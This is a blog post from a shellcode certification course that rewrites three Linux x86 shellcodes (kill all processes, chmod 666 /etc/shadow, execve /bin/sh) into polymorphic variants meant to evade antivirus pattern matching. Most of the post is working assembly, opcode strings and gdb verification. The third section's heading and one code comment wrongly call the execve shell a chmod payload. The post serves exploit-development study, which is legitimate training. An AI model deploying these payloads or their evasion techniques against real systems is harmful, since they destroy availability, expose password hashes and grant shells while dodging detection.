---
layout: post
title: SLAE Assignment 6 - Polymorphic Shells
date: '2016-12-06T21:35:00.000-06:00'
author: Sanjiv Kawa
tags:
- SLAE
- SecurityTube
- Assignment
- Shellcode
- nasm
- assembly
- polymorphic shells
comments: true
---

### SLAE Assignment Stub
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a>

Student ID: SLAE-807


### Assignment 6 Requirements
- Take three shellcodes from <a href="http://shell-storm.org/">Shell-Storm</a> and create polymorphic versions of them to beat pattern matching.
- The polymorphic version can not be larger than 150% of the existing shellcode. So if the existing shellcode is 30 bytes, the polymorphic version can not be larger than 45 bytes.


### Polymorphic Shell
The folks over at <a href="https://twitter.com/SecurityTube">SecurityTube</a> have stated that the basic principles of polymorphic shellcode consist of:

- Making shellcode look different every time it is created, in terms of the codes fingerprint.
- Replace existing instructions with instructions that are semantically equivalent so that the functionality of the shellcode is preserved.
- Add garbage instructions that do not change the functionality in any way. These are called `NOP` equivalents or, no operation equivalents. These are instructions that do nothing.

Ultimately, the goal of polymorphic shellcode is to evade antivirus detection.

### Shellcode 1 - Kill all processes
The author of the original shellcode is Kris Katterjohn. The code can be found <a href="http://shell-storm.org/shellcode/files/shellcode-212.php">here</a>.

#### Original Shellcode

~~~ nasm
;By Kris Katterjohn 11/13/2006

;11 byte shellcode to kill all processes for Linux/x86
global _start

section .text

_start:

  ; kill(-1, SIGKILL)
  push byte 37
  pop eax
  push byte -1
  pop ebx
  push byte 9
  pop ecx
  int 0x80
~~~

#### Compiling the Original Shellcode

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes-original
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
"\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80"
[+] Size: 11 bytes
skawa@ubuntu:~/Desktop/code/assignment/assignment6$
~~~

#### Polymorphic Shellcode
The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/kill-all-processes.nasm">here</a>

Below is an explanation of the changes.

~~~ nasm
;kill-all-processes.nasm
;this kills all processes on the local system
;Linux x86
;Saniv Kawa (@skawasec)
;www.popped.io
;December 6, 2016
;16 bytes

global _start

section .text

_start:

  push byte 9
  mov al, 9  ;arithmetic for AL register
  mov cl, 4 ;arithmetic for AL register
  mul cl ;arithmetic for AL register. AL now contains 36
  inc al ;AL now contains the correct syscall number, 37
  pop ecx ;ECX contains 9
  push byte -1
  pop ebx
  int 0x80
~~~

#### Compiling the Polymorphic Shellcode

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh kill-all-processes
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
"\x6a\x09\xb0\x09\xb1\x04\xf6\xe1\xfe\xc0\x59\x6a\xff\x5b\xcd\x80"
[+] Size: 16 bytes
skawa@ubuntu:~/Desktop/code/assignment/assignment6$
~~~

#### Disassembly of the Original Shellcode

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./kill-all-processes-original
Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/kill-all-processes-original...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment6/kill-all-processes-original

Breakpoint 1, 0x08048080 in _start ()
(gdb) disas
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	push   0x25
   0x08048082 <+2>:	pop    eax
   0x08048083 <+3>:	push   0xffffffff
   0x08048085 <+5>:	pop    ebx
   0x08048086 <+6>:	push   0x9
   0x08048088 <+8>:	pop    ecx
   0x08048089 <+9>:	int    0x80
End of assembler dump.
(gdb) break *0x08048089
Breakpoint 2 at 0x8048089
(gdb) c
Continuing.

Breakpoint 2, 0x08048089 in _start ()
(gdb) i r
eax            0x25	37
ecx            0x9	9
edx            0x0	0
ebx            0xffffffff	-1
esp            0xbffff6e0	0xbffff6e0
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048089	0x8048089 <_start+9>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb)
~~~

#### Disassembly of the Polymorphic Shellcode

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./kill-all-processes
Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/kill-all-processes...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment6/kill-all-processes

Breakpoint 1, 0x08048080 in _start ()
(gdb) disas
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	push   0x9
   0x08048082 <+2>:	mov    al,0x9
   0x08048084 <+4>:	mov    cl,0x4
   0x08048086 <+6>:	mul    cl
   0x08048088 <+8>:	inc    al
   0x0804808a <+10>:	pop    ecx
   0x0804808b <+11>:	push   0xffffffff
   0x0804808d <+13>:	pop    ebx
   0x0804808e <+14>:	int    0x80
End of assembler dump.
(gdb) break *0x0804808e
Breakpoint 2 at 0x804808e
(gdb) c
Continuing.

Breakpoint 2, 0x0804808e in _start ()
(gdb) i r
eax            0x25	37
ecx            0x9	9
edx            0x0	0
ebx            0xffffffff	-1
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x804808e	0x804808e <_start+14>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb)
~~~

After comparing the state of the general purpose registers in the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.

In addition, the size of the original shellcode is 11 bytes. The size of the polymorphic shellcode is 16 bytes, meeting the size restrictions set by SecurityTube.

### Shellcode 2 - chmod 666 /etc/shadow
The author of the original shellcode is "root@thegibson". The code can be found <a href="http://shell-storm.org/shellcode/files/shellcode-566.php">here</a>.

#### Original Shellcode

~~~ nasm
; linux/x86 chmod 666 /etc/shadow 27 bytes
; root@thegibson
; 2010-01-15

section .text
  global _start

_start:
  ; chmod("//etc/shadow", 0666);
  mov al, 15
  cdq
  push edx
  push dword 0x776f6461
  push dword 0x68732f63
  push dword 0x74652f2f
  mov ebx, esp
  mov cx, 0666o
  int 0x80
~~~

#### Compiling the Original Shellcode

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod-original
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
"\xb0\x0f\x99\x52\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
[+] Size: 27 bytes
skawa@ubuntu:~/Desktop/code/assignment/assignment6$
~~~

#### Polymorphic Shellcode
The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/chmod-shadow.nasm">here</a>

Below is an explanation of the changes.

~~~ nasm
;chmod-shadow.nasm
;this changes the permissions for /etc/shadow to 666
;Linux x86
;Saniv Kawa (@skawasec)
;www.popped.io
;December 6, 2016
;40 bytes

global _start

section .text

_start:
  mov al, 8 ;arithmetic for AL register
  add al, al  ;arithmetic for AL register
  dec al ;AL now contains the correct syscall number, 15
  cdq
  push ecx  ;null terminate
  push word 0x776f  ; wo
  push word 0x6461  ; da
  push word 0x6873  ; hs
  push word 0x2f63  ; /c
  push word 0x7465  ; te
  push word 0x2f2f  ; //
  mov ebx, esp  ;stack pointer
  mov cx, 0666o ; permissions 666
  int 0x80
~~~

#### Compiling the Polymorphic Shellcode

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh chmod
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
"\xb0\x08\x00\xc0\xfe\xc8\x99\x51\x66\x68\x6f\x77\x66\x68\x61\x64\x66\x68\x73\x68\x66\x68\x63\x2f\x66\x68\x65\x74\x66\x68\x2f\x2f\x89\xe3\x66\xb9\xb6\x01\xcd\x80"
[+] Size: 40 bytes
skawa@ubuntu:~/Desktop/code/assignment/assignment6$
~~~

#### Disassembly of the Original Shellcode

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./chmod-original
Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/chmod-original...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment6/chmod-original

Breakpoint 1, 0x08048080 in _start ()
(gdb) disas
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    al,0xf
   0x08048082 <+2>:	cdq    
   0x08048083 <+3>:	push   edx
   0x08048084 <+4>:	push   0x776f6461
   0x08048089 <+9>:	push   0x68732f63
   0x0804808e <+14>:	push   0x74652f2f
   0x08048093 <+19>:	mov    ebx,esp
   0x08048095 <+21>:	mov    cx,0x1b6
   0x08048099 <+25>:	int    0x80
End of assembler dump.
(gdb) break *0x08048099
Breakpoint 2 at 0x8048099
(gdb) c
Continuing.

Breakpoint 2, 0x08048099 in _start ()
(gdb) i r
eax            0xf	15
ecx            0x1b6	438
edx            0x0	0
ebx            0xbffff6f0	-1073744144
esp            0xbffff6f0	0xbffff6f0
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048099	0x8048099 <_start+25>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) x/16bx 0xbffff6f0
0xbffff6f0:	0x2f	0x2f	0x65	0x74	0x63	0x2f	0x73	0x68
0xbffff6f8:	0x61	0x64	0x6f	0x77	0x00	0x00	0x00	0x00
(gdb)
~~~

#### Disassembly of the Polymorphic Shellcode

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./chmod
Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/chmod...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment6/chmod

Breakpoint 1, 0x08048080 in _start ()
(gdb) disas
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    al,0x8
   0x08048082 <+2>:	add    al,al
   0x08048084 <+4>:	dec    al
   0x08048086 <+6>:	cdq    
   0x08048087 <+7>:	push   ecx
   0x08048088 <+8>:	pushw  0x776f
   0x0804808c <+12>:	pushw  0x6461
   0x08048090 <+16>:	pushw  0x6873
   0x08048094 <+20>:	pushw  0x2f63
   0x08048098 <+24>:	pushw  0x7465
   0x0804809c <+28>:	pushw  0x2f2f
   0x080480a0 <+32>:	mov    ebx,esp
   0x080480a2 <+34>:	mov    cx,0x1b6
   0x080480a6 <+38>:	int    0x80
End of assembler dump.
(gdb) break *0x080480a6
Breakpoint 2 at 0x80480a6
(gdb) c
Continuing.

Breakpoint 2, 0x080480a6 in _start ()
(gdb) i r
eax            0xf	15
ecx            0x1b6	438
edx            0x0	0
ebx            0xbffff700	-1073744128
esp            0xbffff700	0xbffff700
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x80480a6	0x80480a6 <_start+38>
eflags         0x216	[ PF AF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) x/16bx 0xbffff700
0xbffff700:	0x2f	0x2f	0x65	0x74	0x63	0x2f	0x73	0x68
0xbffff708:	0x61	0x64	0x6f	0x77	0x00	0x00	0x00	0x00
(gdb)
~~~

After comparing the state of the general purpose registers and values on the stack in both the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.

In addition, the size of the original shellcode is 27 bytes. The size of the polymorphic shellcode is 40 bytes, meeting the size restrictions set by SecurityTube.

### Shellcode 3 - chmod 666 /etc/shadow
The author of the original shellcode is "kernel_panik". The code can be found <a href="http://shell-storm.org/shellcode/files/shellcode-752.php">here</a>.

#### Original Shellcode

~~~ nasm
;Title: linux/x86 Shellcode execve ("/bin/sh") - 21 Bytes
;Date     : 10 Feb 2011
;Author   : kernel_panik
;Thanks   : cOokie, agix, antrhacks

global _start

section .text

_start:
 xor ecx, ecx
 mul ecx
 push ecx
 push 0x68732f2f   ;; hs//
 push 0x6e69622f   ;; nib/
 mov ebx, esp
 mov al, 11
 int 0x80
~~~

#### Compiling the Original Shellcode

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack-original
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
[+] Size: 21 bytes
skawa@ubuntu:~/Desktop/code/assignment/assignment6$
~~~

#### Polymorphic Shellcode
The polymorphic version of the shellcode I have created can be found <a href="https://github.com/skahwah/slae/blob/master/assignment6/execve-stack-bin-sh.nasm">here</a>

Below is an explanation of the changes.

~~~ nasm
;execve-stack-bin-sh.nasm
;this changes the permissions for /etc/shadow to 666
;Linux x86
;Saniv Kawa (@skawasec)
;www.popped.io
;December 6, 2016
;29 bytes
global _start

section .text

_start:
  xor ebx, ebx ;zero out EBX
  push ebx ;push 0 on to the stack
  pop eax ;pop 0 off the stack and zero out EAX
  push eax ;null terminate
  mov bl, 6 ;arithmetic for AL register
  add bl, bl ;arithmetic for AL register
  dec bl ;arithmetic for AL register
  push word 0x6873 ;hs
  push word 0x2f2f ;//
  push 0x6e69622f ;nib/
  mov eax, esp  ;stack pointer
  xchg eax, ebx ;EAX now contains the correct syscall value, 11.  
                ;EBX contians the stack pointer
  int 0x80
~~~

#### Compiling the Polymorphic Shellcode

~~~ bash
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ ./compile.sh execve-bin-sh-stack
[+] Assembling with Nasm
[+] Linking
[+] Extracting Opcodes
"\x31\xdb\x53\x58\x50\xb3\x06\x00\xdb\xfe\xcb\x66\x68\x73\x68\x66\x68\x2f\x2f\x68\x2f\x62\x69\x6e\x89\xe0\x93\xcd\x80"
[+] Size: 29 bytes
skawa@ubuntu:~/Desktop/code/assignment/assignment6$
~~~

#### Disassembly of the Original Shellcode

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./execve-bin-sh-stack-original
Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/execve-bin-sh-stack-original...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment6/execve-bin-sh-stack-original

Breakpoint 1, 0x08048080 in _start ()
(gdb) disas
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	xor    ecx,ecx
   0x08048082 <+2>:	mul    ecx
   0x08048084 <+4>:	push   ecx
   0x08048085 <+5>:	push   0x68732f2f
   0x0804808a <+10>:	push   0x6e69622f
   0x0804808f <+15>:	mov    ebx,esp
   0x08048091 <+17>:	mov    al,0xb
   0x08048093 <+19>:	int    0x80
End of assembler dump.
(gdb) break *0x08048093
Breakpoint 2 at 0x8048093
(gdb) c
Continuing.

Breakpoint 2, 0x08048093 in _start ()
(gdb) i r
eax            0xb	11
ecx            0x0	0
edx            0x0	0
ebx            0xbffff6d4	-1073744172
esp            0xbffff6d4	0xbffff6d4
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x8048093	0x8048093 <_start+19>
eflags         0x206	[ PF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) x/12bx 0xbffff6d4
0xbffff6d4:	0x2f	0x62	0x69	0x6e	0x2f	0x2f	0x73	0x68
0xbffff6dc:	0x00	0x00	0x00	0x00
(gdb)
~~~

#### Disassembly of the Polymorphic Shellcode

~~~ nasm
skawa@ubuntu:~/Desktop/code/assignment/assignment6$ gdb -q ./execve-bin-sh-stack
Reading symbols from /home/skawa/Desktop/code/assignment/assignment6/execve-bin-sh-stack...(no debugging symbols found)...done.
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /home/skawa/Desktop/code/assignment/assignment6/execve-bin-sh-stack

Breakpoint 1, 0x08048080 in _start ()
(gdb) disas
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	xor    ebx,ebx
   0x08048082 <+2>:	push   ebx
   0x08048083 <+3>:	pop    eax
   0x08048084 <+4>:	push   eax
   0x08048085 <+5>:	mov    bl,0x6
   0x08048087 <+7>:	add    bl,bl
   0x08048089 <+9>:	dec    bl
   0x0804808b <+11>:	pushw  0x6873
   0x0804808f <+15>:	pushw  0x2f2f
   0x08048093 <+19>:	push   0x6e69622f
   0x08048098 <+24>:	mov    eax,esp
   0x0804809a <+26>:	xchg   ebx,eax
   0x0804809b <+27>:	int    0x80
End of assembler dump.
(gdb) break *0x0804809b
Breakpoint 2 at 0x804809b
(gdb) c
Continuing.

Breakpoint 2, 0x0804809b in _start ()
(gdb) i r
eax            0xb	11
ecx            0x0	0
edx            0x0	0
ebx            0xbffff6e4	-1073744156
esp            0xbffff6e4	0xbffff6e4
ebp            0x0	0x0
esi            0x0	0
edi            0x0	0
eip            0x804809b	0x804809b <_start+27>
eflags         0x202	[ IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x0	0
(gdb) x/12bx 0xbffff6e4
0xbffff6e4:	0x2f	0x62	0x69	0x6e	0x2f	0x2f	0x73	0x68
0xbffff6ec:	0x00	0x00	0x00	0x00
(gdb)
~~~

After comparing the state of the general purpose registers and values on the stack in both the original shellcode and the polymorphic shellcode, it is evident that all replaced instructions are semantically equivalent and the functionality of the original shellcode is preserved.

In addition, the size of the original shellcode is 21 bytes. The size of the polymorphic shellcode is 29 bytes, meeting the size restrictions set by SecurityTube.
